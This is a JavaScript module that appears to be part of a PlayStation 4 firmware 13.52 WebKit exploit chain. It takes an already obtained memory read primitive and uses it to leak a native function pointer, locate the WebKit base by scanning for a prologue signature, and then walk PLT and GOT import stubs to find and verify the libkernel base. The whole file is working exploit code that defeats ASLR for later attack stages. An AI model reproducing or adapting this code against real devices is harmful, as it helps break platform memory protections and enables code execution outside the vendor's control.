/** 13.52 libkernel bootstrap — low PLT imports, no high IAT (+0x3cb8cc8). */
import { int64 } from "./int64.mjs";

const SCE_MAGIC = 0x1d3d154f;
const SCE_ELF_OFF = 0x160;
const POOPS_SCAN_LO = 0x10000;
const POOPS_OOM_LO = 0x2f000;
const POOPS_OOM_HI = 0x34000;

/** Sony module .text prologue (matches poc chain_1352 MEASURE-13.52). */
const TEXT_MAGIC = [0xe5894855, 0x56415741, 0x54415541, 0x8d485053];
const WALK_MAX_BACK = 0x2800000;
const LIBK_WALK_MAX = 0x80000;
/** Browser WebKit GOT __error when off.wk___imp___error is null (measure only). */
const WK_IMP_ERROR_MEASURE = 0x3cb8cc8;

const IMPORT_PLT_CANDS = [
    0x178, 0x188, 0x8d8, 0x918, 0x2438, 0x500, 0x600, 0x800, 0xa00, 0xc00,
    0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
];

function read8p(p, a) {
    if (!a) return null;
    try { return p.read8(a); } catch (_) { return null; }
}
function read4p(p, a) {
    if (!a) return null;
    try { return p.read4(a); } catch (_) { return null; }
}
function read2p(p, a) {
    if (!a) return null;
    try { return p.read2(a); } catch (_) { return null; }
}
function read1p(p, a) {
    if (!a) return null;
    try { return p.read1(a); } catch (_) { return null; }
}

export function pageAlignDown(addr, align) {
    align = align || 0x4000;
    return new int64((addr.low >>> 0) & ~(align - 1), addr.hi >>> 0);
}

export function lkAligned(lk) {
    return lk && lk.hi >= 0x8 && (lk.low & 0x3fff) === 0;
}

export function textMagicAt(p, addr) {
    const q0 = read8p(p, addr);
    const q1 = read8p(p, addr.add32(8));
    if (!q0 || !q1) return false;
    return q0.low === TEXT_MAGIC[0] && q0.hi === TEXT_MAGIC[1]
        && q1.low === TEXT_MAGIC[2] && q1.hi === TEXT_MAGIC[3];
}

/**
 * Runtime webkit + libkernel bases (poc chain_1352.js MEASURE-13.52).
 * Gadget RVAs in ps4_13.52 still come from the measured row; this finds ASLR bases.
 */
export function measureBases1352(p, off) {
    const out = {
        webkit: null,
        libkernel: null,
        nativeFn: null,
        errImport: null,
        measExpm1: 0,
        verdict: "skipped",
        detail: "",
    };
    if (!p || !off) return out;
    try {
        const mCell = p.leakval(Math.expm1);
        const mFunc = read8p(p, mCell.add32(0x18));
        const mFn = mFunc
            ? read8p(p, mFunc.add32(off.wk_JSFunction_m_function)) : null;
        if (!mFn) {
            out.verdict = "THREW";
            out.detail = "nativeFn";
            return out;
        }
        out.nativeFn = mFn;
        const page = v => pageAlignDown(v, 0x4000);
        let cand = null;
        let steps = 0;
        const seedCand = mFn.sub32(off.wk_expm1_builtin);
        if ((seedCand.low & 0x3fff) === 0 && textMagicAt(p, seedCand))
            cand = seedCand;
        else {
            for (let back = 0; back <= WALK_MAX_BACK; back += 0x4000) {
                const at = page(mFn).sub32(back);
                if (textMagicAt(p, at)) { cand = at; break; }
                steps++;
            }
        }
        if (!cand || !cand.hi) {
            out.verdict = "DIFFERS-no-text-magic";
            out.detail = "nativeFn=" + mFn + " walked=" + steps;
            return out;
        }
        out.webkit = cand;
        out.measExpm1 = mFn.sub32(cand.low).low >>> 0;
        out.verdict = "CONFIRMED";
        const impRva = (typeof off.wk___imp___error === "number" && off.wk___imp___error > 0)
            ? off.wk___imp___error : WK_IMP_ERROR_MEASURE;
        const errFn = read8p(p, cand.add32(impRva));
        if (errFn) {
            out.errImport = errFn;
            const epage = pageAlignDown(errFn, 0x4000);
            for (let back = 0; back <= LIBK_WALK_MAX; back += 0x4000) {
                const at = epage.sub32(back);
                if (textMagicAt(p, at)) {
                    out.libkernel = at;
                    break;
                }
            }
            if (!out.libkernel)
                out.verdict = "DIFFERS-libk-no-text-magic";
            if (off.k__error) {
                const kCand = errFn.sub32(off.k__error);
                const bothOk = errFn.hi > 0 && errFn.low >= 0x1000
                    && kCand.hi > 0 && (kCand.low & 0x3fff) === 0;
                if (bothOk) out.verdict = "CONFIRMED";
            }
        } else {
            out.verdict = "DIFFERS-import-read";
        }
        out.detail = "webkit=" + cand + " meas_expm1=0x" + out.measExpm1.toString(16)
            + " errfn=" + (errFn || "-")
            + " libkernel=" + (out.libkernel || "-");
    } catch (e) {
        out.verdict = "THREW";
        out.detail = e && e.message ? e.message : String(e);
    }
    return out;
}

export function parseHexAddr(hex) {
    hex = String(hex || "").replace(/^0x/i, "").trim();
    if (!hex) return null;
    let n;
    try { n = BigInt("0x" + hex); } catch (_) { return null; }
    return new int64(Number(n & 0xffffffffn), Number(n >> 32n));
}

function s32(v) {
    if (v == null) return null;
    return v | 0;
}

function plausibleExtPtr(fn, webkitBase) {
    if (!fn || fn.hi < 0x8) return false;
    if (!webkitBase) return true;
    if (fn.hi !== webkitBase.hi) return true;
    const d = (fn.low - webkitBase.low) >>> 0;
    return d >= 0x800000;
}

function resolveImportPtr(p, webkitBase, fnPtr, depth) {
    if (!fnPtr || depth > 1) return fnPtr;
    if (plausibleExtPtr(fnPtr, webkitBase)) return fnPtr;
    const b0 = read1p(p, fnPtr);
    const b1 = read1p(p, fnPtr.add32(1));
    if (b0 !== 0xff || b1 !== 0x25) return null;
    const disp = s32(read4p(p, fnPtr.add32(2)));
    if (disp == null) return null;
    const tgt = read8p(p, fnPtr.add32(6 + disp));
    if (!tgt) return null;
    return resolveImportPtr(p, webkitBase, tgt, depth + 1);
}

function lkRvaRows(off) {
    const rows = [];
    const keys = ["k_usleep", "k__error", "k_open", "k_mmap", "k_read"];
    for (let i = 0; i < keys.length; i++) {
        const k = keys[i];
        const rva = off[k];
        if (typeof rva === "number" && rva > 0)
            rows.push({ key: k, rva, pri: i });
    }
    return rows;
}

function calcLkFromFnPtr(fnPtr, off) {
    const table = lkRvaRows(off);
    const out = [];
    const seen = new Set();
    for (let i = 0; i < table.length; i++) {
        const row = table[i];
        const raw = fnPtr.sub32(row.rva);
        for (const lk of [raw, pageAlignDown(raw)]) {
            const key = String(lk);
            if (seen.has(key) || !lkAligned(lk)) continue;
            seen.add(key);
            out.push({ lk, via: "rva-" + row.key, pri: row.pri });
        }
    }
    out.sort((a, b) => a.pri - b.pri);
    return out;
}

function checkPrologueAt(p, addr) {
    const w0 = read4p(p, addr);
    const w1 = read4p(p, addr.add32(4));
    if (w0 == null || w1 == null) return false;
    return (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f;
}

function verifyLk(p, lk) {
    if (!lkAligned(lk)) return false;
    if (checkPrologueAt(p, lk)) return true;
    if (read4p(p, lk) === SCE_MAGIC)
        return checkPrologueAt(p, lk.add32(SCE_ELF_OFF));
    return false;
}

function lkFromImportFn(p, fnPtr, off, pltRva, webkitBase) {
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    const zeros = calcLkFromFnPtr(fnPtr, off);
    for (let i = 0; i < zeros.length; i++) {
        const z = zeros[i];
        if (verifyLk(p, z.lk))
            return { lk: z.lk, via: z.via + "+plt+0x" + pltRva.toString(16), fnPtr };
    }
    const pageBase = pageAlignDown(fnPtr, 0x4000);
    if (verifyLk(p, pageBase))
        return { lk: pageBase, via: "page+plt+0x" + pltRva.toString(16), fnPtr };
    return null;
}

function tryOnePlt(p, webkitBase, off, pltRva) {
    const stub = webkitBase.add32(pltRva);
    const op = read2p(p, stub);
    if (op !== 0x25ff && op !== 0x15ff) return null;
    const disp = s32(read4p(p, stub.add32(2)));
    if (disp == null) return null;
    const raw = read8p(p, stub.add32(6 + disp));
    if (!raw) return null;
    const fn = resolveImportPtr(p, webkitBase, raw, 0);
    if (!fn) return null;
    return lkFromImportFn(p, fn, off, pltRva, webkitBase);
}

function pltCandidates(off) {
    const out = [];
    const seen = new Set();
    function add(rva) {
        if (rva == null || rva < POOPS_SCAN_LO) return;
        const k = rva >>> 0;
        if (seen.has(k)) return;
        seen.add(k);
        out.push(k);
    }
    if (off) {
        add(off.wk_plt_stack_chk_fail);
        add(off.wk_plt___error);
    }
    for (let i = 0; i < IMPORT_PLT_CANDS.length; i++)
        add(IMPORT_PLT_CANDS[i]);
    return out;
}

function inOomHole(rva) {
    return rva >= POOPS_OOM_LO && rva < POOPS_OOM_HI;
}

/**
 * @param {object} opts.fnPtrHex — libkernel **function** ptr (e.g. usleep), not lk base
 */
export function resolveLibkernel1352(p, webkitBase, off, opts) {
    opts = opts || {};
    if (opts.fnPtrHex && off.k_usleep) {
        const fn = parseHexAddr(opts.fnPtrHex);
        if (fn) {
            const raw = fn.sub32(off.k_usleep);
            for (const lk of [raw, pageAlignDown(raw)]) {
                if (lkAligned(lk) && verifyLk(p, lk))
                    return { ok: true, lk, via: "manual-usleep-rva", fnPtr: fn };
            }
        }
    }

    const cands = pltCandidates(off);
    for (let i = 0; i < cands.length; i++) {
        const pltRva = cands[i];
        if (inOomHole(pltRva)) continue;
        const hit = tryOnePlt(p, webkitBase, off, pltRva);
        if (hit)
            return { ok: true, lk: hit.lk, via: hit.via, fnPtr: hit.fnPtr, pltRva };
    }
    return {
        ok: false,
        error: "no low-PLT import → libkernel (try ?lkfn=0x… usleep fn from cal 2e)",
    };
}
